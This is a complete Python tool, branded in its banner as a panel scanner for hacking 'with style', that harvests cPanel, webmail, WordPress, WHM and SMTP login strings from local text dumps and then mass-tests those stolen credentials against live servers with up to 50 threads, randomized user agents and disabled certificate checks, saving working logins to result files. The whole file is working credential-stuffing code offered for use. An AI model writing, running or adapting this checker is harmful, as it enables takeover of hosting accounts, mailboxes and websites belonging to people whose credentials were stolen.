import os
import re
import sys
import concurrent.futures
import requests
import threading
import urllib3
import smtplib
from colorama import init, Fore, Style
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

g = Fore.GREEN
r = Fore.RED
c = Fore.CYAN
y = Fore.YELLOW

lock = threading.Lock()

def ensure_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

ensure_dir('Results')

def print_colored(message, color):
    print(color + message)

def display_banner():
    banner = f"""
{Fore.LIGHTMAGENTA_EX}
             {Fore.WHITE}      ／＞　 フ
             {Fore.WHITE}     | 　_　_| 
             {Fore.WHITE}   ／` ミ＿xノ 
             {Fore.WHITE}  /　　　　 |
             {Fore.WHITE} /　 /　　 ﾉ
             {Fore.WHITE}|　　|　|　|
{Fore.LIGHTMAGENTA_EX}／￣|　　 |　|　|
{Fore.LIGHTMAGENTA_EX}| (￣ヽ＿_ヽ_)__)
{Fore.LIGHTMAGENTA_EX}＼二つ

{Fore.LIGHTYELLOW_EX}────────────────────────────────────────────────────
{Fore.LIGHTMAGENTA_EX}   {Style.BRIGHT}Mr Spy's Ultimate Panel Scanner: Kawaii Mode Activated!
{Fore.LIGHTYELLOW_EX}────────────────────────────────────────────────────
{Fore.LIGHTWHITE_EX}  Scan, check, and hack with style – Stay stealthy, agent!
    """
    print(banner)

def get_random_user_agent():
    ua_path = "lib/ua.txt"
    if os.path.exists(ua_path):
        with open(ua_path, "r") as ua_file:
            user_agents = [ua.strip() for ua in ua_file if ua.strip()]
        if user_agents:
            return random.choice(user_agents)
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

def extract_cpanel(line):
    pattern = re.compile(r'(http[s]?:\/\/[^\s]+:208[23](\/[^\s]*)?)')
    return [match.group() for match in pattern.finditer(line)]

def extract_webmail(line):
    pattern = re.compile(r'(http[s]?:\/\/[^\s]+:209[56](\/[^\s]*)?)')
    return [match.group() for match in pattern.finditer(line)]

def extract_wordpress(line):
    if "localhost" in line.lower():
        return []
    pattern = re.compile(r'(http[s]?://[^\s]+/(wp-login\.php|wp-admin)([^\s]*)?)', re.IGNORECASE)
    return [match.group() for match in pattern.finditer(line)]

def extract_whm(line):
    pattern = re.compile(r'(http[s]?:\/\/[^\s]+:208[67](\/[^\s]*)?)')
    return [match.group() for match in pattern.finditer(line)]

def extract_smtp(line):
    pattern = re.compile(r'(smtp:\/\/[^\s:]+:[^\s:]+:[^\s]+)')
    return [match.group() for match in pattern.finditer(line)]

def process_file(filename, extractor, extractor_name):
    results = set()
    encodings = ['utf-8', 'latin-1', 'cp1252']
    print(f"{Fore.YELLOW}[!] Working in file: {filename} [{extractor_name}]")
    for encoding in encodings:
        try:
            with open(filename, 'r', encoding=encoding) as file:
                for linenum, line in enumerate(file, 1):
                    line = line.strip()
                    found = extractor(line)
                    if found:
                        for v in found:
                            print(f"{Fore.LIGHTCYAN_EX}[+] Scraped line in {filename} (line {linenum}): {v}")
                        results.update(found)
            break
        except UnicodeDecodeError:
            continue
    return results

def save_to_file(filename, data):
    with open(filename, 'w', encoding='utf-8') as file:
        for line in sorted(data):
            file.write(line + '\n')

def extract_from_txt_files(mode):
    txt_files = [
        f for f in os.listdir('.')
        if f.endswith('.txt') and f not in ('cpanels.txt', 'webmails.txt', 'wordpress.txt', 'whms.txt', 'smtps.txt')
    ]
    all_results = set()
    if mode == "cpanel":
        extractor = extract_cpanel
        outname = "cpanels.txt"
        color = Fore.GREEN
        name = "cPanel"
    elif mode == "webmail":
        extractor = extract_webmail
        outname = "webmails.txt"
        color = Fore.CYAN
        name = "Webmail"
    elif mode == "wordpress":
        extractor = extract_wordpress
        outname = "wordpress.txt"
        color = Fore.MAGENTA
        name = "WordPress"
    elif mode == "whm":
        extractor = extract_whm
        outname = "whms.txt"
        color = Fore.YELLOW
        name = "WHM"
    elif mode == "smtp":
        extractor = extract_smtp
        outname = "smtps.txt"
        color = Fore.LIGHTBLUE_EX
        name = "SMTP"
    else:
        print(Fore.RED + "Unknown extraction mode!")
        return
    for filename in txt_files:
        all_results.update(process_file(filename, extractor, name))
    save_to_file(outname, all_results)
    print(color + f"[✔] Extracted {name} lines have been saved to {outname}")

def extract_all():
    txt_files = [
        f for f in os.listdir('.')
        if f.endswith('.txt') and f not in ('cpanels.txt', 'webmails.txt', 'wordpress.txt', 'whms.txt', 'smtps.txt')
    ]
    all_cpanel, all_webmail, all_wordpress, all_whm, all_smtp = set(), set(), set(), set(), set()
    for filename in txt_files:
        all_cpanel.update(process_file(filename, extract_cpanel, "cPanel"))
        all_webmail.update(process_file(filename, extract_webmail, "Webmail"))
        all_wordpress.update(process_file(filename, extract_wordpress, "WordPress"))
        all_whm.update(process_file(filename, extract_whm, "WHM"))
        all_smtp.update(process_file(filename, extract_smtp, "SMTP"))
    save_to_file("cpanels.txt", all_cpanel)
    save_to_file("webmails.txt", all_webmail)
    save_to_file("wordpress.txt", all_wordpress)
    save_to_file("whms.txt", all_whm)
    save_to_file("smtps.txt", all_smtp)
    print(Fore.GREEN + "[✔] All URLs have been extracted and saved to their respective files.")

def cpcheck(url):
    try:
        domain, username, password = url.split("|")
        login_url = domain + "/login/?login_only=1"
        login_url = login_url.replace("http://", "https://").replace(":2082", ":2083")
        data = {'user': username, 'pass': password}
        req = requests.post(login_url, data=data, timeout=15, verify=False)
        if 'security_token' in req.text:
            with lock:
                print_colored(f"[cPanel] {url} ==> cPanel Login Successful!", g)
                with open('Results/cpanels_valid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
        else:
            with lock:
                print_colored(f"[cPanel] {url} ==> cPanel Login Invalid!", r)
                with open('Results/cpanels_invalid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
    except Exception:
        with lock:
            print_colored(f"[cPanel] {url} ==> cPanel Host Invalid", r)
            with open('Results/cpanels_invalid.txt', 'a', encoding='utf-8') as f:
                f.write(url + "\n")

def wbcheck(url):
    try:
        domain, username, password = url.split("|")
        login_url = f"{domain}/login/?login_only=1"
        login_url = login_url.replace("http://", "https://").replace(":2095", ":2096")
        data = {'user': username, 'pass': password}
        req = requests.post(login_url, data=data, timeout=15, verify=False)
        if 'security_token' in req.text:
            with lock:
                print_colored(f"[Webmail] {url} ==> Webmail Login Successful!", g)
                with open('Results/webmails_valid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
        else:
            with lock:
                print_colored(f"[Webmail] {url} ==> Webmail Login Invalid!", r)
                with open('Results/webmails_invalid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
    except Exception:
        with lock:
            print_colored(f"[Webmail] {url} ==> Webmail Host Invalid", r)
            with open('Results/webmails_invalid.txt', 'a', encoding='utf-8') as f:
                f.write(url + "\n")

def wpcheck(url):
    try:
        domain, username, password = url.split("|")
        if domain.endswith("/"):
            domain = domain[:-1]
        login_url = f"{domain}/wp-login.php"
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f'{domain}/wp-admin/',
            'testcookie': '1'
        }
        headers = {
            'User-Agent': get_random_user_agent(),
            'Referer': f'{domain}/wp-login.php'
        }
        response = requests.post(login_url, data=payload, headers=headers, timeout=20, verify=False, allow_redirects=True)
        if ('wp-admin' in response.url) or ('Dashboard' in response.text):
            with lock:
                print_colored(f"[WordPress] {url} ==> WordPress Login Successful!", g)
                with open('Results/wordpress_valid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
        else:
            with lock:
                print_colored(f"[WordPress] {url} ==> WordPress Login Failed!", r)
                with open('Results/wordpress_invalid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
    except Exception as e:
        with lock:
            print_colored(f"[WordPress] {url} ==> WordPress Host Invalid ({e})", r)
            with open('Results/wordpress_invalid.txt', 'a', encoding='utf-8') as f:
                f.write(url + "\n")

def whmcheck(url):
    try:
        if url.endswith("/"):
            url = url[:-1]
        login_url = url + "/login/"
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(login_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
        if "whm" in response.text.lower() or "webhost manager" in response.text.lower():
            with lock:
                print_colored(f"[WHM] {url} ==> WHM Login Page Detected!", g)
                with open('Results/whms_valid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
        else:
            with lock:
                print_colored(f"[WHM] {url} ==> WHM Login Not Detected!", r)
                with open('Results/whms_invalid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
    except Exception as e:
        with lock:
            print_colored(f"[WHM] {url} ==> WHM Host Invalid ({e})", r)
            with open('Results/whms_invalid.txt', 'a', encoding='utf-8') as f:
                f.write(url + "\n")

def smtpcheck(line):
    try:
        if not line.startswith("smtp://"):
            return
        parts = line.strip().replace("smtp://", "").split(":")
        if len(parts) < 3:
            print_colored(f"[SMTP] {line} ==> Invalid Format!", r)
            with open('Results/smtps_invalid.txt', 'a', encoding='utf-8') as f:
                f.write(line + '\n')
            return
        host, user, password = parts[0], parts[1], ":".join(parts[2:])
        ports = [587, 465, 25]
        success = False
        for port in ports:
            try:
                if port == 465:
                    server = smtplib.SMTP_SSL(host, port, timeout=10)
                else:
                    server = smtplib.SMTP(host, port, timeout=10)
                server.ehlo()
                if port == 587:
                    server.starttls()
                server.login(user, password)
                server.quit()
                with lock:
                    print_colored(f"[SMTP] {line} ==> SMTP Login Successful! ({port})", g)
                    with open('Results/smtps_valid.txt', 'a', encoding='utf-8') as f:
                        f.write(line + '\n')
                success = True
                break
            except Exception:
                continue
        if not success:
            with lock:
                print_colored(f"[SMTP] {line} ==> SMTP Login Failed!", r)
                with open('Results/smtps_invalid.txt', 'a', encoding='utf-8') as f:
                    f.write(line + '\n')
    except Exception as e:
        with lock:
            print_colored(f"[SMTP] {line} ==> SMTP Exception: {e}", r)
            with open('Results/smtps_invalid.txt', 'a', encoding='utf-8') as f:
                f.write(line + '\n')

def smtp_checker_menu():
    print(Fore.CYAN + "Provide the filename with extracted SMTP lines (e.g., smtps.txt):", end=' ')
    filename = input().strip()
    with open(filename, 'r', encoding='utf-8') as f:
        smtp_list = f.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(20) as executor:
        executor.map(smtpcheck, smtp_list)

def cpanel_checker_menu():
    print(Fore.CYAN + "Provide the filename with extracted cPanel URLs (e.g., cpanels.txt):", end=' ')
    filename = input().strip()
    with open(filename, 'r', encoding='utf-8') as f:
        cpanel_list = f.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(50) as executor:
        executor.map(cpcheck, cpanel_list)

def webmail_checker_menu():
    print(Fore.CYAN + "Provide the filename with extracted Webmail URLs (e.g., webmails.txt):", end=' ')
    filename = input().strip()
    with open(filename, 'r', encoding='utf-8') as f:
        webmail_list = f.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(50) as executor:
        executor.map(wbcheck, webmail_list)

def wordpress_checker_menu():
    print(Fore.CYAN + "Provide the filename with extracted WordPress URLs (e.g., wordpress.txt):", end=' ')
    filename = input().strip()
    with open(filename, 'r', encoding='utf-8') as f:
        wordpress_list = [line.strip() for line in f if "|" in line]
    with concurrent.futures.ThreadPoolExecutor(30) as executor:
        executor.map(wpcheck, wordpress_list)

def whm_checker_menu():
    print(Fore.CYAN + "Provide the filename with extracted WHM URLs (e.g., whms.txt):", end=' ')
    filename = input().strip()
    with open(filename, 'r', encoding='utf-8') as f:
        whm_list = f.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(30) as executor:
        executor.map(whmcheck, whm_list)

def main_menu():
    display_banner()
    while True:
        print(Fore.GREEN + Style.BRIGHT + "\nSelect an option:" + Style.RESET_ALL)
        print(Fore.CYAN + "1. " + Fore.LIGHTYELLOW_EX + "Extract cPanel URLs Only")
        print(Fore.CYAN + "2. " + Fore.LIGHTYELLOW_EX + "Extract Webmail URLs Only")
        print(Fore.CYAN + "3. " + Fore.LIGHTYELLOW_EX + "Extract WordPress URLs Only")
        print(Fore.CYAN + "4. " + Fore.LIGHTYELLOW_EX + "Extract WHM URLs Only")
        print(Fore.CYAN + "5. " + Fore.LIGHTYELLOW_EX + "Extract SMTP lines Only")
        print(Fore.CYAN + "6. " + Fore.LIGHTYELLOW_EX + "Extract ALL (cPanel/Webmail/WordPress/WHM/SMTP)")
        print(Fore.CYAN + "7. " + Fore.LIGHTYELLOW_EX + "cPanel Checker")
        print(Fore.CYAN + "8. " + Fore.LIGHTYELLOW_EX + "Webmail Checker")
        print(Fore.CYAN + "9. " + Fore.LIGHTYELLOW_EX + "WordPress Checker")
        print(Fore.CYAN + "10. " + Fore.LIGHTYELLOW_EX + "WHM Checker")
        print(Fore.CYAN + "11. " + Fore.LIGHTYELLOW_EX + "SMTP Checker")
        print(Fore.CYAN + "12. " + Fore.LIGHTYELLOW_EX + "Exit" + Style.RESET_ALL)
        choice = input(Fore.RED + "\nEnter your choice (1-12): " + Style.RESET_ALL).strip()
        if choice == '1':
            extract_from_txt_files("cpanel")
        elif choice == '2':
            extract_from_txt_files("webmail")
        elif choice == '3':
            extract_from_txt_files("wordpress")
        elif choice == '4':
            extract_from_txt_files("whm")
        elif choice == '5':
            extract_from_txt_files("smtp")
        elif choice == '6':
            extract_all()
        elif choice == '7':
            cpanel_checker_menu()
        elif choice == '8':
            webmail_checker_menu()
        elif choice == '9':
            wordpress_checker_menu()
        elif choice == '10':
            whm_checker_menu()
        elif choice == '11':
            smtp_checker_menu()
        elif choice == '12':
            print(Fore.GREEN + "Exiting... Goodbye Agent!")
            break
        else:
            print(Fore.RED + "Invalid choice! Please select a valid option.")

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted! Exiting...")
        sys.exit(0)